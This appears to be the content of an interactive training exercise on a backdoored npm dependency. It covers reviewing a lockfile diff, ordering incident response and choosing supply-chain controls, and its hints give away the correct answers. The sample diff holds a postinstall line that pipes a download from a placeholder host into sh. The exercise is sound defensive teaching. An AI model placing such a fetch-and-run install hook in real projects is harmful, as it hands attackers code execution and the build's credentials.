title: The dependency that shipped a backdoor
summary: Read a lockfile change for supply-chain risk, order an incident response, and keep the recovery verifiable.

scenario.briefing: A routine patch release of a small logging package added a postinstall script that downloads a binary. The build server ran it with a deployment token. Review the dependency change, then order the response so the team contains the compromise before cleaning up.

objectives.description: Identify the dependency and build risks in the diff.
Order containment, eradication, recovery, and learning.
Explain controls that reduce future supply-chain risk.

hints: A transitive package is still part of your runtime.
Install scripts run with the build job's permissions.
Containment comes before removal and rebuilds.
Pin and verify dependencies, scope CI tokens, and keep an SBOM or provenance record.

misconceptions.description: Treating a patch version bump as automatically safe.
misconceptions.feedback: Semantic versioning is a promise, not a control. A patch release can add a transitive dependency and an install script. Review the resolved graph.

misconceptions.description: Removing the package before containing the compromised credentials.
misconceptions.feedback: Removing the package without revoking the build token leaves the attacker with live access. Contain credentials and build capacity first.

misconceptions.description: Assuming a public registry makes every package trustworthy.
misconceptions.feedback: A registry hosts both good and malicious packages. Pin, verify integrity, review install scripts, and limit what a build can reach.

sections.title: The dependency graph is part of your code
sections.body: A direct dependency can pull in transitive packages you never chose. The lockfile records the exact resolved versions and integrity hashes, so a diff to it is security-relevant even when package.json barely changes.

sections.title: Install scripts run with your authority
sections.body: npm lifecycle scripts execute during install. In CI they inherit the job's token, network access, and filesystem. A compromised package does not need a runtime vulnerability; it can act during the build.

sections.title: Contain before you clean
sections.body: Incident response starts by limiting the attacker's access: revoke tokens, isolate the runner, and preserve evidence. Removal and rebuilds come after containment. Recovery ends with verification, not with a green build.

steps.prompt: Select every supported finding and choose a verdict.

artifact.title: Dependency update
artifact.caption: A patch bump to a logging helper, as seen in the pull request.
artifact.content:
package.json
-  "logfmt": "2.4.1",
+  "logfmt": "2.4.2",

 pnpm-lock.yaml
+  logfmt@2.4.2:
+    dependencies:
+      telemetry-helper: 1.0.3
+  telemetry-helper@1.0.3:
+    hasBin: true
+    requiresBuild: true
+
 package.json scripts (from telemetry-helper)
+  "postinstall": "curl -fsSL https://cdn.example.invalid/agent | sh"

findings.label: The patch adds a transitive package the project never chose.
The new package runs a network download during install.
The lockfile gained a package and build flag without a review note.
An install script runs with the CI job's credentials and network access.
A patch version bump guarantees the dependency is safe.

verdicts.label: Block until the transitive package and install script are removed or verified

steps.explanation: The resolved graph changed, and the new package executes a network download during install. Tests do not exercise the build environment's credentials.

steps.title: Order the incident response
steps.prompt: Arrange the response from the first action to the last.
hints: Start by confirming what ran and where.
Cut off the attacker's access before deleting evidence.
Remove the malicious version and rebuild from a verified lockfile.
Finish by verifying recovery and recording what changed.

items.label: Confirm the package, version, and which builds ran the script
Revoke build and deployment tokens and isolate the runner
Remove the version and rebuild from a clean, pinned lockfile
Restore service and verify artifacts and credentials
Record the timeline and add dependency review controls

steps.explanation: Detection identifies scope. Containment removes access. Eradication removes the malicious artifact. Recovery verifies a clean state, and the review prevents repetition.

steps.title: Reduce the next supply-chain risk
hints: Think about what the build job can reach.
A registry is a host, not a trust decision.
Lockfiles and integrity hashes make changes visible.
Select pinning, scoped tokens, install-script review, and provenance; reject registry trust.

statements.label: Pinning versions and verifying lockfile integrity makes dependency changes reviewable.
CI tokens should be scoped to the job and rotated after exposure.
Install scripts deserve review because they run during the build.
Provenance and SBOM records help verify what was built and from which inputs.
A package hosted on a public registry has been security-reviewed by that registry.

steps.explanation: Supply-chain safety comes from pinned inputs, limited build authority, reviewed install behavior, and evidence about the produced artifact.

accessibility.summary: Every control is reachable by keyboard, and the checks report text results rather than color alone.
accessibility.keyboardNotes: Use Tab to move between controls. Space selects a choice, and Ctrl+Enter runs or submits the active check.
accessibility.screenReaderNotes: Each option, finding, and test announces its label, state, and whether the check passed.
